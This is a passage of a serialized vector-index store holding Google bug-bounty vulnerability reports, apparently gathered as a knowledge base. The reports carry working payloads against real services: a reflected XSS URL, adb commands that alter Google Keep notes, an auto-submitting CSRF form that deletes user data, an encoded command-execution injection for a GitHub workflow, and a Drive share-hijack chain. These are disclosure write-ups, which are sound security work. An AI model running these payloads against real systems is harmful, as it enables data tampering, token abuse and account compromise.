"file_type": "text/plain", "file_size": 997, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "63da70ac3d78470948bb368e72b2013fd89629ccbf5b08fe1d40e9773fef8dc9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: 3rd parties able to download Google Form responses through Drive\r\nSteps to reproduce:\r\nCreate Test Data (or use this example data:\r\nhttps://drive.google.com/drive/folders/13pytRliHEcqP7Fe7zAQyop00GO51nLyY?usp=sharing\r\n)\r\nCreate a test document and a test form in Google Drive.\r\nClick on the form and put in some test data.\r\nPut those two items in a folder.\r\nShare the folder using a link.\r\nHave someone that was only given the link download multiple documents, one of which is the form (or use Download All).\r\nGoogle Drive creates a zip and downloads it; open that zip folder.\r\nOpen the enclosed folder, and go to the enclosed zip, which will be yourformname.zip\r\nInside yourformname.zip is a csv containing all responses to the form.\r\nAttack scenario:\r\nA user who has been granted View access to a folder containing a form can download the results of a form, instead of just the form itself. When sharing a form, it should not share the results of that form unless specifically selected.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 997, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "abf1b763-aeff-47f9-956e-c04fc9fc3b81": {"__data__": {"id_": "abf1b763-aeff-47f9-956e-c04fc9fc3b81", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_222631.clean.txt", "file_name": "20250408_175638_222631.clean.txt", "file_type": "text/plain", "file_size": 643, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4f366716-47f7-4bce-a027-ba9826fb5e15", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_222631.clean.txt", "file_name": "20250408_175638_222631.clean.txt", "file_type": "text/plain", "file_size": 643, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ab8b72596bf192f117a275755f99c058ff44a27ba153c07ae28146d593ddc0bb", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nreflected xss\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://admin.cameyo.com/login/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nReflected XSS Vulnerability Report\r\nSteps to Reproduce:\r\nhttps://admin.cameyo.com/login/command?op=&entityId=%22%20onclick=%22alert(1)%22%20x=%22&esn=\r\nclick to the logo\r\nyou will find alert of value = 1\r\nAttack scenario\r\nA reflected Cross-Site Scripting (XSS) vulnerability was discovered on\r\nas it allows an attacker to execute arbitrary JavaScript code within the context of a victim's session, potentially leading to account compromise, data theft, or unauthorized actions on behalf of the user.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 643, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a00e9a92-aad8-491a-a446-793fe8a63a93": {"__data__": {"id_": "a00e9a92-aad8-491a-a446-793fe8a63a93", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_048674.clean.txt", "file_name": "20250408_175645_048674.clean.txt", "file_type": "text/plain", "file_size": 1371, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "788b1741-5713-4b00-b067-2c3b7fa7509b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_048674.clean.txt", "file_name": "20250408_175645_048674.clean.txt", "file_type": "text/plain", "file_size": 1371, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "2c3246aec24ff1ead40b64f6868bd13a61e23aa21a4686f12e28569acd47d46b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle app spoofing\r\nProduct:\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.googlequicksearchbox\r\nVulnerability type:\r\nSecurity UI Spoofing\r\nDetails\r\n<a href=\"faceviewer://arvr.google.com/faceviewer?arbi=1&wturl=https://sites.google.com/view/ndevtkembed/home\">tap</a>\r\nintentSpoof.mp4\r\n<a href=\"intent://arvr.google.com/scene-viewer/1.2?file=https%3A%2F%2Fstorage.googleapis.com%2Far-answers-in-search-models%2Fstatic%2FMallardDuck%2Fmodel.glb&card_content=https%3A%2F%2Fstorage.googleapis.com%2Fndevtk%2Fndevtk-spoof9.html&mode=3d_only#Intent;package=com.google.android.googlequicksearchbox;scheme=https;end;\">tap</a>\r\nduckSpoof.mp4\r\nThere is also a feature of the scene viewer to stream interactive fullscreen content from a server called Immersive Stream for XR. (Not just a 3d duck that opens a delayed fullscreen webview)\r\nAttack scenario\r\nA website gets put in fullscreen without the warning toast allowing control of the URL bar.\r\nNormally when a website uses the API after user activation a message is shown to tell the user there in fullscreen and how to exit this is important because it means the security UI can no longer be trusted as it can be spoofed.\r\nWhile the \"line of death\" may not be effective its all there is for preventing spoofs of this kind.\r\nhttps://emilymstark.com/2022/12/18/death-to-the-line-of-death.html", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1371, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "61798928-d7e4-425b-9f74-91f21ae97ab6": {"__data__": {"id_": "61798928-d7e4-425b-9f74-91f21ae97ab6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_307170.clean.txt", "file_name": "20250408_175654_307170.clean.txt", "file_type": "text/plain", "file_size": 2003, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "f19845dc-1c38-40f7-a9f5-22076d941232", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_307170.clean.txt", "file_name": "20250408_175654_307170.clean.txt", "file_type": "text/plain", "file_size": 2003, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "dd769e3f5e3f6a0c44b19db2b81e0bcc879c9ef227252a274bdfe7f4f3dc9143", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nBug allows third-party apps to create and delete notes in Google Keep\r\nProduct:\r\nGoogle Keep\r\nURL:\r\nhttps://play.google.com/store/apps/details?id=com.google.android.keep\r\nVulnerability type:\r\nOther\r\nDetails\r\nBug Details\r\nThe\r\nandroid:exported\r\nflag of\r\nVoiceActionActivity\r\npresent in Google Keep is set to\r\nTrue\r\n.\r\nAs the result any third party app can launch it to do the malicious stuff. It provides direct access to the following functionalities to any third-party app without user's interaction :\r\nCreate new notes.\r\nDelete notes.\r\nUpdate notes.\r\nVulnerable Activity:\r\ncom.google.android.keep.activities.VoiceActionActivity\r\nReproudction\r\nIn order to reproduce the bug, we need  following things :-\r\nAndroid device, with latest Google Keep installed.\r\nADB installed on PC\r\nNote Creation\r\nConnect your device with PC, make sure the USB debugging is enabled.\r\nCopy-Paste the below shell command in terminal\r\nadb shell am start-activity -a com.google.android.gms.actions.CREATE_NOTE --es android.intent.extra.TEXT testing com.google.android.keep/.activities.VoiceActionActivity\r\nYou will see an activity got popped up with the content\r\ntesting\r\n. At this time the note is created and saved.\r\nNote Deletion\r\nIn order to delete a note we need\r\nnoteUuid\r\n, it is a random value, that gets generated while note creation. But if we somehow got to know the uuid,  then the below command can be used to delete the\r\nnote\r\nwithout user's interaction or notifying it.\r\nadb shell am start-activity -a -a com.google.android.gms.actions.DELETE_NOTE --es --es noteUuid <noteUuidHere> com.google.android.keep/.activities.VoiceActionActivity\r\nIn order to verify, I captured the uuid from web app of Google Keep, and used above command to see if it delete. The result was positive.\r\nPoC File\r\nI am attaching a bash file for the reference\r\nAttack scenario\r\nThe threat here is that the bug allows access to certain\r\nauthorized  functionalities\r\nthat leads to\r\ntampering\r\nof user's data present in Google Keep.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2003, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8292560e-95e7-457d-9f39-ba54e24af9be": {"__data__": {"id_": "8292560e-95e7-457d-9f39-ba54e24af9be", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_249721.clean.txt", "file_name": "20250408_175717_249721.clean.txt", "file_type": "text/plain", "file_size": 1874, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cc7da19d-5515-493a-80d9-56d1e268bf9b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175717_249721.clean.txt", "file_name": "20250408_175717_249721.clean.txt", "file_type": "text/plain", "file_size": 1874, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9b972aa818092206e46120f1e50ad600f859d451eb6a6cb0022c2a2e28c20054", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Possible to find 'edit ID form ' 'viewform' ID, which leads to view/edit form if link sharing\r\nSteps to reproduce:\r\nCreate a Google Form, and enter to SEND link without login.\r\nView source, and find 'maestro_new_project_uri' and find the corresponding link(Be aware that the URL is encoded like \\u, decode it)(\r\nhttps://script.google.com/macros/create?mid=\r\n<alphabets>&uiv=2 )\r\nEnter to the link with login(another account) and devtools, and notify it 302s to another link(\r\nhttps://script.google.com/home/projects/create?authuser=0&parent=\r\n<Form ID> )\r\nNotify that form ID of 1. is same as 'parent' parameter of the link of 3.\r\nBrowser/OS: Any\r\nAttack scenario:\r\nUser A([REDACTED_EMAIL]) creates a form, and share(Add collaborators) as link sharing. (\r\nhttps://docs.google.com/forms/d/1C0wLTPaZI7-n2SB82XIzdEhWpPC_B3qoWp7d9t8XimE/edit\r\n)\r\nUser A send the form link(\r\nhttps://docs.google.com/forms/d/e/1FAIpQLSdXjdMIzGCOZWnddsj4O-n5WXCCFbopwOVjYI4PyoadtveXrA/viewform\r\n) to User B([REDACTED_EMAIL]).\r\nUser B enter to the link, view source, and find 'maestro_new_project_uri' and find the corresponding link(Be aware that the URL is encoded like \\u, decode it)(\r\nhttps://script.google.com/macros/create?mid=ACjPJvFfkBR3_kH5D0Xmw5WlA2VbBJVXbIy2DpU2U3cafVDEgLkFrEhRCjLcQi-zNABSMQv7lC7OhPRm2ell-W5TAHAKcAo5u4DB3hp_MPEFTRmNhycl&uiv=2\r\nUser B enter to this link with devtools. The link 302s to the link like: (\r\nhttps://script.google.com/home/projects/create?authuser=0&parent=1C0wLTPaZI7-n2SB82XIzdEhWpPC_B3qoWp7d9t8XimE\r\n). As you can see, 'parent' param is the same as the ID of User A's form.\r\nNow User B can craft of the link of the form(\r\n).\r\nAs a result, User B can edit the form, view responses, etc.\r\nSo, if the victim had shared(Add collaborators) the form and sent link to the attacker, the attacker can find the edit/response link of the form of the victim.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1874, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d873be0e-e9bc-4dfb-bed1-6afc0d680a98": {"__data__": {"id_": "d873be0e-e9bc-4dfb-bed1-6afc0d680a98", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_404463.clean.txt", "file_name": "20250408_175710_404463.clean.txt", "file_type": "text/plain", "file_size": 1264, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "77785a5c-ac2f-4bd7-b57d-280bdd1bcb85", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175710_404463.clean.txt", "file_name": "20250408_175710_404463.clean.txt", "file_type": "text/plain", "file_size": 1264, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "0adc14f212b87fa3f19a6c5d7963f75e37ca459ff135252b422c6c00eeb2b59e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Sensitive Information Disclosure by .json file\r\nSteps to reproduce:\r\nGo to any web-browser (I prefer chrome and firefox) .\r\nOpen Each Bug Url link in your web browser. (Given below)\r\nExposed information will be seen in your browser (Check image POC for further information).\r\nBug url :\r\nhttps://fileserv.siemplify.co/composer.json\r\nhttps://fileserv.siemplify.co/package-lock.json\r\nhttps://fileserv.siemplify.co/package.json\r\nhttps://fileserv.siemplify.co/vendor/composer/installed.json\r\nhttps://mitre.siemplify.co/web.config\r\nBrowser/OS: Firefox and Chrome\r\nSummary :\r\nI have found some files that might disclose some juicy and critical information like name, id, etc (Sensitive file disclosure) .\r\nRedemption :\r\nIf these files are not in use, then these files should be removed or put a limitation to access for external users.\r\nAttack scenario:\r\nSome juicy information that might help an attacker in information gathering about organization and might also contain some sensitive data.\r\nAttacker can user these valuable information for advance attack as brute-force login.\r\nIt is possible to get all the users registered on the system and create a brute-force directed to these users.\r\nAcquisition info:\r\nhttps://www.crunchbase.com/organization/siemplify", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1264, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4b3428e3-0d60-4cdf-844a-a1872253dd78": {"__data__": {"id_": "4b3428e3-0d60-4cdf-844a-a1872253dd78", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_727301.clean.txt", "file_name": "20250408_175712_727301.clean.txt", "file_type": "text/plain", "file_size": 2337, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "b949fcd3-d214-4441-b771-7006ed718920", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_727301.clean.txt", "file_name": "20250408_175712_727301.clean.txt", "file_type": "text/plain", "file_size": 2337, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "092d58da4be510988dc1179b5824e4ecaea055cce54b3bf1bc5b2e5f4b90ac4a", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nA csrf in exporteducationprogram.googlecnapps.cn  leads to deleting  user data\r\nThe vulnerability is known to third parties!\r\nProduct:\r\nGrow\r\nURL:\r\nhttps://exporteducationprogram.googlecnapps.cn/\r\nVulnerability type:\r\nCross-site request forgery (CSRF)\r\nDetails\r\na csrf  in exporteducationprogram.googlecnapps.cn  leads  to deleting user data\r\nrelevant url:\r\nhttps://exporteducationprogram.googlecnapps.cn/appacademy/home?utm_source=wechat&utm_medium=wechat_menu_bar&utm_campaign=ewg_online_training_platform&openid=oQJ0wsxRtjc-I6r6NelZ6swbgCrk\r\nclick the button\r\nDelete Data\r\nin that page, the request package can be captured as follows:\r\nPOST /appacademy/api/clear HTTP/1.1\r\nHost: exporteducationprogram.googlecnapps.cn\r\nConnection: close\r\nContent-Length: 2\r\nsec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"\r\nAccept: application/json, text/plain,\r\n/\r\nContent-Type: application/x-www-form-urlencoded\r\nsec-ch-ua-mobile: ?0\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36\r\nsec-ch-ua-platform: \"Windows\"\r\nOrigin:\r\nhttps://exporteducationprogram.googlecnapps.cn\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: cors\r\nSec-Fetch-Dest: empty\r\nReferer:\r\nhttps://exporteducationprogram.googlecnapps.cn/appacademy/home?utm_source=wechat&utm_medium=wechat_menu_bar&utm_campaign=ewg_online_training_platform&openid=\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7\r\nCookie: aa-session=\"eyJhYV9pc19lbnJvbGwiOnRydWUsImFhX3VzZXJfaWQiOiI1OTQ1ODk0MTU1MzIxMzQ0IiwiYWFfaXNfd2hpdGVsaXN0IjpmYWxzZX0\\075|1640841511|591ee02f37f3fe7e7c36111cb1bb5927c32cad47\"\r\n{}\r\n'\r\nIt is vulnerable to a csrf, and the poc:\r\n<html>\r\n<!-- CSRF PoC - generated by Burp Suite Professional -->\r\n<body>\r\n<script>history.pushState('', '', '/')</script>\r\n<form action=\"https://exporteducationprogram.googlecnapps.cn/appacademy/api/clear\" method=\"POST\">\r\n<input id=\"submit0\" type=\"submit\" value=\"Submit request\" />\r\n<script> window.onload=function(){\r\ndocument.getElementById(\"submit0\").click();\r\n}\r\n</script>\r\n</form>\r\n</html>\r\nuser visit other websites which have evil html like the csrf poc , and then user data like Course learning progress data on this website will be deleted. It will give bad experience on user.\r\nAttack scenario", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2337, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "9822fca6-ba2f-4503-b4b4-aac72947e041": {"__data__": {"id_": "9822fca6-ba2f-4503-b4b4-aac72947e041", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_660731.clean.txt", "file_name": "20250408_175642_660731.clean.txt", "file_type": "text/plain", "file_size": 3071, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "22f957bd-a26c-48b8-84be-4b9aab652512", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175642_660731.clean.txt", "file_name": "20250408_175642_660731.clean.txt", "file_type": "text/plain", "file_size": 3071, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9fbe225444986104c2a0bf2275b191610516e752c7c719d7898ab47de1753dd9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle OSS-Fuzz's pr_helper.yml GitHub Actions workflow is vulnerable to a Javascript injection which allows an attacker to abuse the GITHUB_TOKEN with pull-requests: write permission.\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/google/oss-fuzz/blob/master/.github/workflows/pr_helper.yml\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nThe GitHub Actions workflow (\r\n.github/workflows/pr_helper.yml\r\n) of the OSS-Fuzz project (i.e.\r\n) is vulnerable to a Javascript injection which allows the attacker to abuse the permissions of the GITHUB_TOKEN (i.e.\r\npull-requests: write\r\n). The injection is done through the\r\nMESSAGE\r\nenvironment variable on line 57 (\r\nhttps://github.com/google/oss-fuzz/blob/master/.github/workflows/pr_helper.yml#L57\r\n) and is possible the arbitrary (unconstrained) user provided value\r\nrepo_url\r\nin the\r\nproject.yaml\r\nfile is concatenated on line 104 of the\r\ninfra/pr_helper.py\r\nPython script (\r\nhttps://github.com/google/oss-fuzz/blob/master/infra/pr_helper.py#L104\r\n).\r\nAttack scenario\r\nAn attacker forks the public repo of OSS-Fuzz\r\nhttps://github.com/google/oss-fuzz/\r\n)\r\nCreates a branch in the fork in order to open a Pull Request against the upstream which must contain:\r\nprojects/new-project-which-does-not-exist/doesnotmatter.txt\r\n(pretends to create a new project - which could be legitimate in fact)\r\nExplicitly DOES NOT put the\r\nat the base of that project, but instead put somewhere else in the branch (for instance at the root - or in a sub-directory of the new project). As long as the file is called\r\n(ex. ``projects/new-project-which-does-not-exist/whatever/project.yaml`)\r\nMalicious\r\nmust contain a maliciously crafted\r\nmain_repo\r\nvalue such as:\r\n\"aa'+require('child_process').execSync(atob('YmFzaCAtYyAnaWQ7ZW52Jw==')).toString()+'bb\"\r\nThe code flow of\r\npr_helper.py\r\nwill parse the PR and fall back to an alternate code path where the\r\nget_integrated_project_info()\r\nfunction will be called, loading arbitrary YAML and the value\r\nwill be injected as raw in the string, which will be set as an environment variable\r\nThe env var\r\nwill be injected verbatim (interpolated) as Javascript, leading to Arbitrary Remote Code Execution in the context of the\r\nLeave comments\r\nstep.\r\nBecause the workflow is processing the event\r\npull_request_target\r\n, the attacker can craft a payload which has the ability to dump the memory of the GitHub Actions runner (given that the\r\nGITHUB_TOKEN\r\nis not set as en var in the context of the\r\nLeaving Comments\r\nThe\r\nhas a\r\npermission, which can allow the attacker to:\r\nAdd the\r\nReady to merge\r\nlabel\r\nDelete the original comment\r\nattacker is integrating a new project: ...\r\nReplace it with a fake comment\r\nattacker (verified) is either the primary contact or is in the CCs list of projects/openssl.\r\nGiven that the\r\npr_helper.yml\r\nworkflow only triggers on the\r\nopened\r\nevent of\r\n, the attacker can force push on his branch, and point some change to\r\nprojects/openssl\r\n, while he is not allowed to and would not normally get\r\nautomatically applied, but he was able to fake it.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3071, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "d351b19e-7c84-418d-93b1-8c52113b00f6": {"__data__": {"id_": "d351b19e-7c84-418d-93b1-8c52113b00f6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.clean.txt", "file_name": "20250408_175640_393408.clean.txt", "file_type": "text/plain", "file_size": 6861, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0d027fb3-dddd-49d2-a881-3531e12cc8fa", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.clean.txt", "file_name": "20250408_175640_393408.clean.txt", "file_type": "text/plain", "file_size": 6861, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ef8fb9a8ff1a60ff6d380542996d13a29fdd009e43b51dc0d5a445c0906c984e", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "571b87d3-1327-4fd2-900a-f57f74803b7c", "node_type": "1", "metadata": {}, "hash": "7f50f081cb348e759baf5fd383f624cb2ea096b15697ca135b8d89cb8f7f1737", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nA chain of Google Docs flaws leads to one-click Drive folder/file hijack\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://docs.google.com/\r\nVulnerability type:\r\nOther\r\nDetails\r\nThis vulnerability is a chain of a few different tricks.\r\nGoogle Slides YouTube path traversal\r\nYou can embed YouTube videos in Google Slides. The way it works is that your client provides Slides with a video ID (eg\r\nprzDcQe6n5o\r\n), and it will iframe it as an embed (eg\r\nhttps://www.youtube.com/embed/przDcQe6n5o\r\n).\r\nThis functionality does not validate the video ID, so it's possible to perform a path traversal. For example, using the video ID\r\n../example\r\nwill end up with an iframe at\r\nhttps://www.youtube.com/example\r\n.\r\nYouTube to Google redirect\r\nWe have the ability to visit any youtube.com URL, but it is not particularly useful as most YouTube pages cannot be framed on the docs.google.com origin. However, it turns out that\r\nhttps://www.youtube.com/signin\r\ncan be framed.\r\nThe\r\n/signin\r\npage uses the\r\nnext\r\nquery parameter as the URL to redirect to. From my (limited) testing, it seems like you're only allowed to redirect to\r\n*.youtube.com\r\nURLs.\r\nYouTube has a subdomain at\r\naccounts.youtube.com\r\n, which we can redirect to. This subdomain allows us to do another redirect to certain Google URLs, so we can chain it with the\r\npage to escape YouTube and redirect to other domains.\r\nHere's an example of how to construct such a redirect step-by-step:\r\nhttps://docs.google.com\r\nhttps://accounts.youtube.com/accounts/SetSID?ssdc=1&sidt=&continue=https%3A%2F%2Fdocs.google.com&tcc=1&dbus=EE\r\nhttps://www.youtube.com/signin?action_handle_signin=true&app=desktop&hl=en&next=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1%26sidt%3D%26continue%3Dhttps%3A%2F%2Fdocs.google.com%26tcc%3D1%26dbus%3DEE&feature=passive&hl=en\r\nThe included\r\ngenerate_embed_url.py\r\nscript will automatically do this for you.\r\nDocs Drive preview\r\nSince we can now iframe any\r\ndocs.google.com\r\nURL\r\nas same-origin\r\n, we can bypass the usual restrictions of iframing Docs. The document pages themselves disable the sharing option for iframed documents, and the Docs home page doesn't provide anything too useful.\r\nMost old Google Drive file/folder links now redirect to\r\ndrive.google.com\r\nand cannot be iframed, but I found a URL that still works:\r\ndocs.google.com/file/d/{ID}/edit\r\n. Framing this URL does not disable the share button, so we can use it in a frame.\r\nShare param\r\nIt'd be fairly challening to trick someone into clicking the Share button and typing in your e-mail. It turns out there's a query parameter that will do this automatically:\r\n.../edit?userstoinvite=user@example.org\r\n. This will pop up a pre-filled share dialog on load, so all the target needs to do is click a button labeled \"Send\".\r\nRedirect block bypass\r\nCombining the previous two steps, we will have a URL that looks like this:\r\ndocs.google.com/file/u/example/edit?userstoinvite=\r\nuser@example.org\r\nIf we try to use this URL in our iframe redirect we will end up with a page that says permission denied. This is because we're navigating from\r\nto\r\n, and the file page does not like this redirect.\r\nWe need a\r\nredirect instead. For this we can use an old Docs URLs format designed for Google Workspaces:\r\ndocs.google.com/a/example.org/file...\r\n. This URL format is no longer used, so Docs redirects us to the same URL with the\r\n/a/...\r\npart removed, making the file page happy.\r\nSpoofing the dialog\r\nWe can combine all of the previous concepts to add the share dialog to our presentation, but it's still fairly obvious to the user what clicking \"Send\" will do.\r\nWe can however use the same redirect trick to overlay other content on the same slide to mask the dialog. Docs has many features/services we can iframe, I chose\r\n/htmlpresent\r\nfor my demo but there are probably better ways to do it.\r\nIt's also possible to just move the share dialog to the top left of the screen so that only the Send button is visible without having to cover anything up.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 4007, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "571b87d3-1327-4fd2-900a-f57f74803b7c": {"__data__": {"id_": "571b87d3-1327-4fd2-900a-f57f74803b7c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.clean.txt", "file_name": "20250408_175640_393408.clean.txt", "file_type": "text/plain", "file_size": 6861, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0d027fb3-dddd-49d2-a881-3531e12cc8fa", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.clean.txt", "file_name": "20250408_175640_393408.clean.txt", "file_type": "text/plain", "file_size": 6861, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "ef8fb9a8ff1a60ff6d380542996d13a29fdd009e43b51dc0d5a445c0906c984e", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "d351b19e-7c84-418d-93b1-8c52113b00f6", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_393408.clean.txt", "file_name": 